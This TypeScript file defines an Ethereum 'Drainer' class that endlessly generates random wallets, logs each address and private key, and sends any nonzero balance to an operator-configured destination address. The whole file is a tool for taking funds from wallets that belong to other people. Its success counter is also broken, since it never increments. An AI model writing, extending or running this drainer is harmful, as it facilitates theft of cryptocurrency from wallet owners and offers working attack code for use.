import { config } from './utils/config';
import {ethers} from 'ethers';
import {log} from './utils/logger';

class Drainer {
  private dest: string;
  private provider: ethers.providers.JsonRpcProvider; 
  private totalCount: number;
  private successCount: number;
  private static gasNeeded: number = 21000;
  
  constructor () {
    this.dest = config.destAddress;
    this.provider = new ethers.providers.JsonRpcProvider(config.providerURL);
    this.totalCount = 0;
    this.successCount = 0;
  }
  
  private attemptToDrain = async () => {
    const wallet: ethers.Wallet = ethers.Wallet.createRandom().connect(this.provider);
    const address: string = await wallet.getAddress();
    const privateKey: string = wallet.privateKey;
    const balance_bigNumber: ethers.BigNumber = await wallet.getBalance();
    const balance: string = ethers.utils.formatEther(balance_bigNumber);
    log.logHistory(`Attempt #${this.totalCount}, Address ${address} (private key: ${privateKey}) has ${balance} ETH`);
    if (balance_bigNumber.gt(ethers.BigNumber.from(0))) {
      log.logSuccess(`Success #${this.successCount} at attempt #${this.totalCount}: Address ${address} (private key: ${privateKey}) with ${balance} ETH`)
      const gasPrice = await this.provider.getGasPrice();
      const gasTotal = gasPrice.mul(Drainer.gasNeeded);
      const netAmount = balance_bigNumber.sub(gasTotal);
      const tx = {
          to: this.dest,
          value: netAmount
      };
      wallet.sendTransaction(tx).then((txObj) => {
        log.logSuccess(`txHash: ${txObj.hash}`)
      });
      this.successCount = this.successCount++;
    }
  }  
  
  public run = async () => {
    while (true) {
      await this.attemptToDrain().then(() => {
        this.totalCount = this.totalCount + 1;
      })
    }
  }
}

export const drain = new Drainer();